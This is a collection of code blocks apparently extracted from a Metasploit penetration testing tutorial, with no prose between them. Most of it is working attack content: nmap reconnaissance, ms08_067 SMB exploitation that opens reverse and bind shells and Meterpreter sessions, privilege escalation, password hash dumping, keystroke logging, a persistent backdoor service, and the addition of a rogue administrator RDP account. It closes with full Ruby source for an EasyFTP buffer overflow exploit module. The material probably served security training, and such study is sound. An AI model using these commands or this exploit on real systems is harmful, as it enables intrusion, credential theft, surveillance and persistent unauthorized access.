["```\n # cd /usr/share/exploitdb/\n    # vim files.csv \n```", "```\n # msfconsole \n```", "```\n msf> help \n```", "```\n msf> show -h\n    [*] Valid parameters for the \"show\" command are: all, encoders, \u2028nops, exploits, payloads, auxiliary, plugins, options\n    [*] Additional module-specific parameters are: advanced, evasion, \u2028targets, actions \n```", "```\n # msfcli -x \n```", "```\n # msfcli windows/smb/ms08_067_netapi O\n    [*] Please wait while we load the module tree...\n\n       Name     Current Setting  Required  Description\n       ----     ---------------  --------  -----------\n       RHOST                     yes       The target address\n       RPORT    445              yes       Set the SMB service port\n    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, \u2028SRVSVC) \n```", "```\n # msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.7 P\n    [*] Please wait while we load the module tree...\n\n    Compatible payloads\n    ===================\n\n       Name                             Description\n       ----                             -----------\n    generic/debug_trap               Generate a debug trap in the target process\n    generic/shell_bind_tcp           Listen for a connection and spawn a command shell\n    ... \n```", "```\n # msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.7 LHOST=192.168.0.3 PAYLOAD=windows/shell/reverse_tcp E\n    [*] Please wait while we load the module tree...\n    [*] Started reverse handler on 192.168.0.3:4444\n    [*] Automatically detecting the target...\n    [*] Fingerprint: Windows XP Service Pack 2 - lang:English\n    [*] Selected Target: Windows XP SP2 English (NX)\n    [*] Attempting to trigger the vulnerability...\n    [*] Sending stage (240 bytes) to 192.168.0.7\n    [*] Command shell session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1027)\n\n    Microsoft Windows XP [Version 5.1.2600]\n    (C) Copyright 1985-2001 Microsoft Corp.\n\n    C:WINDOWSsystem32> \n```", "```\n msf> load db_tracker\n    [*] Successfully loaded plugin: db_tracker \n```", "```\n    msf>db_nmap -T Aggressive -sV -n -O -v 192.168.0.7 Starting Nmap 5.00 ( http://nmap.org ) at 2010-11-11 22:34 UTC NSE: Loaded 3 scripts for scanning. Initiating ARP Ping Scan at 22:34 Scanning 192.168.0.7 [1 port] Completed ARP Ping Scan at 22:34, 0.00s elapsed (1 total hosts) Initiating SYN Stealth Scan at 22:34 Scanning 192.168.0.7 [1000 ports] Discovered open port 445/tcp on 192.168.0.7 Discovered open port 135/tcp on 192.168.0.7 Discovered open port 25/tcp on 192.168.0.7 Discovered open port 139/tcp on 192.168.0.7 Discovered open port 3389/tcp on 192.168.0.7 Discovered open port 80/tcp on 192.168.0.7 Discovered open port 443/tcp on 192.168.0.7 Discovered open port 21/tcp on 192.168.0.7 Discovered open port 1025/tcp on 192.168.0.7 Discovered open port 1433/tcp on 192.168.0.7 Completed SYN Stealth Scan at 22:34, 3.04s elapsed (1000 total ports) Initiating Service scan at 22:34\n    Scanning 10 services on 192.168.0.7\n    Completed Service scan at 22:35, 15.15s elapsed (10 services on 1 host)\n    Initiating OS detection (try #1) against 192.168.0.7\n    ...\n    PORT     STATE SERVICE       VERSION\n    21/tcpopen  ftp           Microsoft ftpd\n    25/tcpopen  smtp          Microsoft ESMTP 6.0.2600.2180\n    80/tcpopen  http          Microsoft IIS httpd 5.1\n    135/tcp  openmsrpc         Microsoft Windows RPC\n    139/tcp  opennetbios-ssn\n    443/tcp  open  https?\n    445/tcp  openmicrosoft-ds  Microsoft Windows XP microsoft-ds\n    1025/tcpopen  msrpc         Microsoft Windows RPC\n    1433/tcpopen  ms-sql-s      Microsoft SQL Server 2005 9.00.1399; RTM\n    3389/tcpopen  microsoft-rdp Microsoft Terminal Service\n    MAC Address: 00:0B:6B:68:19:91 (WistronNeweb)\n    Device type: general purpose\n    Running: Microsoft Windows 2000|XP|2003\n    OS details: Microsoft Windows 2000 SP2 - SP4, Windows XP SP2 - SP3, or Windows Server 2003 SP0 - SP2\n    Network Distance: 1 hop\n    TCP Sequence Prediction: Difficulty=263 (Good luck!)\n    IP ID Sequence Generation: Incremental\n    Service Info: Host: custdesk; OS: Windows\n    ...\n    Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds\n               Raw packets sent: 1026 (45.856KB) | Rcvd: 1024 (42.688KB)\n\n```", "```\n msf> search SMB \n```", "```\n msf> use auxiliary/scanner/smb/smb_enumershares \n```", "```\n msf> set RHOSTS 192.168.0.1/24 \n```", "```\n msf> run \n```", "```\n msf> use auxiliary/scanner/vnc/vnc_none_auth\n    msf auxiliary(vnc_none_auth) > show options\n    msf auxiliary(vnc_none_auth) > set RHOSTS 10.4.124.0/24\n    RHOSTS => 10.4.124.0/24\n    msf auxiliary(vnc_none_auth) > run\n    [*] 10.4.124.22:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    [*] 10.4.124.23:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    [*] 10.4.124.25:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    [*] Scanned 026 of 256 hosts (010% complete)\n    [*] 10.4.124.26:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    [*] 10.4.124.27:5900, VNC server security types supported : None, \u2028free access!\n    [*] 10.4.124.28:5900, VNC server security types supported : None, \u2028free access!\n    [*] 10.4.124.29:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    ...\n    [*] 10.4.124.224:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    [*] 10.4.124.225:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    [*] 10.4.124.227:5900, VNC server security types supported : None, \u2028free access!\n    [*] 10.4.124.228:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    [*] 10.4.124.229:5900, VNC server protocol version : \"RFB 004.000\", \u2028not supported!\n    [*] Scanned 231 of 256 hosts (090% complete)\n    [*] Scanned 256 of 256 hosts (100% complete)\n    [*] Auxiliary module execution completed \n```", "```\n msf> use auxiliary/scanner/postgres/postgres_login\n```", "```\n msf> set STOP_ON_SUCCESS true \n```", "```\n msf> set RHOSTS 192.168.0.30\n```", "```\n msf> use exploit/windows/smb/ms08_067_netapi\n    msf exploit(ms08_067_netapi) > show options\n    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7\n    RHOST => 192.168.0.7\n    msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/bind_tcp\n    PAYLOAD => windows/shell/bind_tcp\n    msf exploit(ms08_067_netapi) > exploit\n\n    [*] Started bind handler\n    [*] Automatically detecting the target...\n    [*] Fingerprint: Windows XP Service Pack 2 - lang:English\n    [*] Selected Target: Windows XP SP2 English (NX)\n    [*] Attempting to trigger the vulnerability...\n    [*] Sending stage (240 bytes) to 192.168.0.7\n    [*] Command shell session 1 opened (192.168.0.3:41289 ->\u2028192.168.0.7:4444) at Sat Nov 13 19:01:23 +0000 2010\n    Microsoft Windows XP [Version 5.1.2600]\n    (C) Copyright 1985-2001 Microsoft Corp.\n\n    C:WINDOWSsystem32> \n```", "```\n msf> use exploit/windows/smb/ms08_067_netapi\n    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7\n    RHOST => 192.168.0.7\n    msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/reverse_tcp\n    PAYLOAD => windows/shell/reverse_tcp\n    msf exploit(ms08_067_netapi) > show options\n    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3\n    LHOST => 192.168.0.3\n    msf exploit(ms08_067_netapi) > exploit\n\n    [*] Started reverse handler on 192.168.0.3:4444\n    [*] Automatically detecting the target...\n    [*] Fingerprint: Windows XP Service Pack 2 - lang:English\n    [*] Selected Target: Windows XP SP2 English (NX)\n    [*] Attempting to trigger the vulnerability...\n    [*] Sending stage (240 bytes) to 192.168.0.7\n    [*] Command shell session 1 opened (192.168.0.3:4444 ->\u2028192.168.0.7:1027) at Sat Nov 13 22:59:02 +0000 2010\n    Microsoft Windows XP [Version 5.1.2600]\n    (C) Copyright 1985-2001 Microsoft Corp.\n\n    C:WINDOWSsystem32> \n```", "```\n msf> use exploit/windows/smb/ms08_067_netapi\n    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7\n    RHOST => 192.168.0.7\n    msf exploit(ms08_067_netapi) > show payloads\n    ...\n    msf exploit(ms08_067_netapi) > set PAYLOAD \u2028windows/meterpreter/reverse_tcp\n    PAYLOAD => windows/meterpreter/reverse_tcp\n    msf exploit(ms08_067_netapi) > show options\n    ...\n    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3\n    LHOST => 192.168.0.3\n    msf exploit(ms08_067_netapi) > exploit\n\n    [*] Started reverse handler on 192.168.0.3:4444\n    [*] Automatically detecting the target...\n    [*] Fingerprint: Windows XP Service Pack 2 - lang:English\n    [*] Selected Target: Windows XP SP2 English (NX)\n    [*] Attempting to trigger the vulnerability...\n    [*] Sending stage (749056 bytes) to 192.168.0.7\n    [*] Meterpreter session 1 opened (192.168.0.3:4444 ->\u2028192.168.0.7:1029) at Sun Nov 14 02:44:26 +0000 2010\n    meterpreter> help\n    ... \n```", "```\n    meterpreter>getuid\n    Server username: CUSTDESKsalesdept\n    meterpreter> use priv\n    meterpreter>getsystem -h\n    ...\n```", "```\n meterpreter>getsystem\n    ...got system (via technique 1).\n    meterpreter>getuid\n    Server username: NT AUTHORITYSYSTEM\n    meterpreter>sysinfo\n    Computer: CUSTDESK\n    OS      : Windows XP (Build 2600, Service Pack 2).\n    Arch    : x86\n    Language: en_US \n```", "```\n meterpreter> run hashdump\n    [*] Obtaining the boot key...\n    [*] Calculating the hboot key using SYSKEY 71e52ce6b86e5da0c213566a1236f892...\n    [*] Obtaining the user list and keys...\n    [*] Decrypting user keys...\n    [*] Dumping password hashes...\n    h\n    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n    HelpAssistant:1000:d2cd5d550e14593b12787245127c866d:d3e35f657c924d0b31eb811d2d986df9:::\n    SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:c8edf0d0db48cbf7b2835ec013cfb9c5:::\n    Momin Desktop:1003:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204beb12283678:::\n    IUSR_MOMINDESK:1004:a751dcb6ea9323026eb8f7854da74a24:b0196523134dd9a21bf6b80e02744513:::\n    ASPNET:1005:ad785822109dd077027175f3382059fd:21ff86d627bcf380a5b1b6abe5d8e1dd:::\n    IWAM_MOMINDESK:1009:12a75a1d0cf47cd0c8e2f82a92190b42:c74966d83d519ba41e5196e00f94e113:::\n    h4x:1010:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204beb12283678:::\n    salesdept:1011:8f51551614ded19365b226f9bfc33fab:7ad83174aadb77faac126fdd377b1693::: \n```", "```\n meterpreter>getuid\n    Server username: NT AUTHORITYSYSTEM\n    meterpreter>ps\n    Process list\n    ============\n\n     PID   Name              Arch  Session  User                          \u2028Path\n     ---   ----              ----  -------  ----                          \u2028----\n     0     [System Process]\n     4     System            x86   0        NT AUTHORITYSYSTEM\n     384   smss.exe          x86   0        NT AUTHORITYSYSTEM           \u2028SystemRootSystem32smss.exe\n     488   csrss.exe         x86   0        NT AUTHORITYSYSTEM           \u2028??C:WINDOWSsystem32csrss.exe\n     648   winlogon.exe      x86   0        NT AUTHORITYSYSTEM           \u2028??C:WINDOWSsystem32winlogon.exe\n     692   services.exe      x86   0        NT AUTHORITYSYSTEM           \u2028C:WINDOWSsystem32services.exe\n     704   lsass.exe         x86   0        NT AUTHORITYSYSTEM           \u2028C:WINDOWSsystem32lsass.exe\n    ...\n    148   alg.exe           x86   0        NT AUTHORITYLOCAL SERVICE    \u2028C:WINDOWSSystem32alg.exe\n    3172  explorer.exe      x86   0        CUSTDESKsalesdept\u2028C:WINDOWSExplorer.EXE\n    3236  reader_sl.exe     x86   0        CUSTDESKsalesdept\u2028C:Program FilesAdobeReader 9.0ReaderReader_sl.exe \n```", "```\n meterpreter> migrate 3172\n    [*] Migrating to 3172...\n    [*] Migration completed successfully.\n    meterpreter>getuid\n    Server username: CUSTDESKsalesdept\n    meterpreter>keyscan_start\n    Starting the keystroke sniffer... \n```", "```\n meterpreter>keyscan_dump\n    Dumping captured keystrokes...\n    <Return> www.yahoo.com <Return><Back> www.bbc.co.uk <Return>\n    meterpreter>keyscan_stop\n    Stopping the keystroke sniffer... \n```", "```\n msf exploit(ms08_067_netapi) > exploit\n    [*] Started reverse handler on 192.168.0.3:4444\n    [*] Automatically detecting the target...\n    [*] Fingerprint: Windows XP Service Pack 2 - lang:English\n    [*] Selected Target: Windows XP SP2 English (NX)\n    [*] Attempting to trigger the vulnerability...\n    [*] Sending stage (749056 bytes) to 192.168.0.7\n    [*] Meterpreter session 1 opened (192.168.0.3:4444 ->\u2028192.168.0.7:1032) at Tue Nov 16 19:21:39 +0000 2010\n    meterpreter>ps\n    ...\n     292   alg.exe           x86   0        NT AUTHORITYLOCAL SERVICE    \u2028C:WINDOWSSystem32alg.exe\n    1840  csrss.exe         x86   2        NT AUTHORITYSYSTEM           \u2028??C:WINDOWSsystem32csrss.exe\n     528   winlogon.exe      x86   2        NT AUTHORITYSYSTEM           \u2028??C:WINDOWSsystem32winlogon.exe\n     240   rdpclip.exe       x86   0        CUSTDESKMomin Desktop        \u2028C:WINDOWSsystem32rdpclip.exe\n    1060  userinit.exe      x86   0        CUSTDESKMomin Desktop        \u2028C:WINDOWSsystem32userinit.exe\n    1544  explorer.exe      x86   0        CUSTDESKMomin Desktop        \u2028C:WINDOWSExplorer.EXE\n    ...\n    meterpreter> migrate 1544\n    [*] Migrating to 1544...\n    [*] Migration completed successfully.\n    meterpreter> run metsvc -h\n    ...\n    meterpreter> run metsvc\n    [*] Creating a meterpreter service on port 31337\n    [*] Creating a temporary installation directory \u2028C:DOCUME~1MOMIND~1LOCALS~1TempoNyLOPeS...\n    [*]  >> Uploading metsrv.dll...\n    [*]  >> Uploading metsvc-server.exe...\n    [*]  >> Uploading metsvc.exe...\n    [*] Starting the service...\n             * Installing service metsvc\n     * Starting service\n    Service metsvc successfully installed. \n```", "```\n meterpreter> exit\n [*] Meterpreter session 1 closed. Reason: User exit msf exploit(ms08_067_netapi) > back msf> use exploit/multi/handler msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp PAYLOAD => windows/metsvc_bind_tcp msf exploit(handler) > set LPORT 31337 LPORT => 31337 msf exploit(handler) > set RHOST 192.168.0.7 RHOST => 192.168.0.7 msf exploit(handler) > exploit [*] Starting the payload handler... [*] Started bind handler [*] Meterpreter session 2 opened (192.168.0.3:37251 ->\u2028192.168.0.7:31337) at Tue Nov 16 20:02:05 +0000 2010 meterpreter>getuid Server username: NT AUTHORITYSYSTEM\n```", "```\n meterpreter> run getgui -u btuser -p btpass\n    [*] Windows Remote Desktop Configuration Meterpreter Script by \u2028Darkoperator\n    [*] Carlos Perez carlos_perez@darkoperator.com\n    [*] Language set by user to: 'en_EN'\n    [*] Setting user account for logon\n    [*]     Adding User: btuser with Password: btpass\n    [*]     Adding User: btuser to local group 'Remote Desktop Users'\n    [*]     Adding User: btuser to local group 'Administrators'\n    [*] You can now login with the created user\n    [*] For cleanup use command: run multi_console_command -rc\u2028/root/.msf3/logs/scripts/getgui/clean_up__20101116.3447.rc \n```", "```\n # rdesktop 192.168.0.7:3389 \n```", "```\n ##\n    # $Id: easyftp_mkd_fixret.rb 9935 2010-07-27 02:25:15Z jduck $\n    ## \n```", "```\n ##\n    # This file is part of the Metasploit Framework and may be subject \u2028to\n    # redistribution and commercial restrictions. Please see the \u2028Metasploit\n    # Framework web site for more information on licensing and terms \u2028of use.\n    # http://metasploit.com/framework/\n    ##\n    require 'msf/core' \n```", "```\nclass Metasploit3 <Msf::Exploit::Remote \n```", "```\n Rank = GreatRanking \n```", "```\nincludeMsf::Exploit::Remote::Ftp \n```", "```\ndef initialize(info = {}) \nsuper(update_info(info, \n      'Name'           => 'EasyFTP Server <= 1.7.0.11 MKD Command \u2028Stack Buffer Overflow', \n      'Description'    => %q{ \n          This module exploits a stack-based buffer overflow in \u2028EasyFTP Server 1.7.0.11 \nand earlier. EasyFTP fails to check input size when \u2028parsing 'MKD' commands, which \nleads to a stack based buffer overflow. \n\n        NOTE: EasyFTP allows anonymous access by default. However, \u2028in order to access the \n        'MKD' command, you must have access to an account that can\u2028create directories. \n\n        After version 1.7.0.12, this package was renamed \u2028\"UplusFtp\". \n\n        This exploit utilizes a small piece of code that I've \u2028referred to as 'fixRet'. \n        This code allows us to inject of payload of ~500 bytes \u2028into a 264 byte buffer by \n        'fixing' the return address post-exploitation.  See \u2028references for more information. \n      }, \n      'Author'         => \n        [ \n          'x90c',   # original version \n          'jduck'   # port to metasploit / modified to use fix-up \u2028stub (works with bigger payloads) \n        ], \n      'License'        => MSF_LICENSE, \n      'Version'        => '$Revision: 9935 $', \n      'References'     => \n        [ \n[ 'OSVDB', '62134' ], \n[ 'URL', 'http://www.exploit-db.com/exploits/12044/' ], \n[ 'URL', 'http://www.exploit-db.com/exploits/14399/' ] \n        ], \n```", "```\n 'DefaultOptions' => \n        { \n          'EXITFUNC' => 'thread' \n```", "```\n }, \n      'Privileged'     => false, \n      'Payload'        => \n        { \n          'Space'    => 512, \n          'BadChars' => \"x00x0ax0dx2fx5c\", \n          'DisableNops' => true \n        }, \n```", "```\n 'Platform'       => 'win', \n      'Targets'        => \n        [ \n[ 'Windows Universal - v1.7.0.2',   { 'Ret' =>\u2028          0x004041ec } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.3',   { 'Ret' =>\u2028          0x004041ec } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.4',   { 'Ret' =>\u2028          0x004041dc } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.5',   { 'Ret' =>\u2028          0x004041a1 } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.6',   { 'Ret' =>\u2028          0x004041a1 } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.7',   { 'Ret' =>\u2028          0x004041a1 } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.8',   { 'Ret' =>\u2028          0x00404481 } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.9',   { 'Ret' =>\u2028          0x00404441 } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.10',  { 'Ret' =>\u2028          0x00404411 } ], # call ebp - from ftpbasicsvr.exe \n[ 'Windows Universal - v1.7.0.11',  { 'Ret' =>\u2028          0x00404411 } ], # call ebp - from ftpbasicsvr.exe \n        ], \n      'DisclosureDate' => 'Apr 04 2010', \n      'DefaultTarget' => 0)) \n```", "```\nend \n\ndef check \nconnect \ndisconnect \n\nif (banner =~ /BigFoolCat/) \nreturn Exploit::CheckCode::Vulnerable \nend \nreturn Exploit::CheckCode::Safe \nend \n```", "```\ndefmake_nops(num); \"C\" * num; end \n```", "```\ndef exploit \nconnect_login \n\n    # NOTE: \n    # This exploit jumps to ebp, which happens to point at a \u2028    partial version of \n    # the 'buf' string in memory. The fixRet below fixes up the \u2028    code stored on the \n    # stack and then jumps there to execute the payload. The value \u2028    inesp is used \n    # with an offset for the fixup. \nfixRet_asm = %q{ \nmovedi,esp \nsubedi, 0xfffffe10 \nmov [edi], 0xfeedfed5 \naddedi, 0xffffff14 \njmpedi \n    } \nfixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new, \u2028fixRet_asm).encode_string \n\nbuf = '' \n```", "```\nprint_status(\"Prepending fixRet...\") \nbuf<<fixRet \nbuf<<make_nops(0x20 - buf.length)\n```", "```\nprint_status(\"Adding the payload...\") \nbuf<<payload.encoded \n```", "```\n # Patch the original stack data into the fixer stub \nbuf[10, 4] = buf[268, 4] \n\nprint_status(\"Overwriting part of the payload with target \u2028    address...\") \nbuf[268,4] = [target.ret].pack('V') # put return address @ 268 \u2028    bytes \n```", "```\nprint_status(\"Sending exploit buffer...\") \nsend_cmd( ['MKD', buf] , false) \n```", "```\nhandler \ndisconnect \nend \n\nend \n```"]